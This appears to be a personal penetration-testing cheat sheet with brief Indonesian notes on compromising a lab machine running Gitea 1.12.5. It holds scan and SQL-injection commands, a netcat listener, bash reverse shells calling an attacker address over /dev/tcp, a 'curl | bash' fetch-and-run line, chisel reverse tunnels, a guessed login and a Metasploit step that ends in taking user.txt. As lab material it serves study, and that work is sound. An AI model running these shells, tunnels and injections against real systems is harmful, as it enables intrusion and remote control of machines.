Command
- nmap -sC -sV -oN enum.nmap -p- -T4 --min-rate=1000 -v  (nmapx)
- dirb http://10.1.2.152 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o diretory.dirb (dirbx)
- sqlmap -r inject --dbs --level 4 --risk 3 --threads 10 --tamper=space2comment,between,randomcase (sqlmapx)

- nc -lvnp 9001
- python -c 'import pty;pty.spawn("/bin/bash")';
- bash -c 'bash -i >& /dev/tcp/CHANGE-THIS/9001 0>&1'
- sudo python3 -m http.server 80
- curl 127.0.0.1/shell.sh | bash
- ps -efa --forest

for i in $(seq 254); do ping 10.1.2.${i} -c1 -W1 & done | grep from
for i in {1.255}; do (ping -c 1 10.1.2.${i} | grep "bytes from"&); done

for i in $(seq 254); do ping 10.1.2.${i} -c1 -W1 & done | grep from
chisel server --socks5 --reverse
./chisel client --fingerprint &lt;Fingerprint&gt; &lt;Attacker IP&gt;:8080 R:8000:&lt;Internal IP&gt;:80

./chisel client --fingerprint &lt;Fingerprint&gt; &lt;Attacker IP&gt;:8080 R:socks

Payload

```
test
asda
```

Set alias

- nmap
- buka port 3000 gitea
- coba guessing password dengan username yang ada
username: askira
password: askira
- mencari kerentanan pada layanan gitea versi 1.12.5
- menggunakan module metasploit untuk memasukan reverse shell
    - listening port 9001 pada local machine
    nc -lvnp 9001
    - memasukan code reverse shell pada target machine
    bash -c 'bash -i >& /dev/tcp/10.18.200.73/9001 0>&1'
    - mengambil flag user.txt
    ![Alt text](images/user.png)
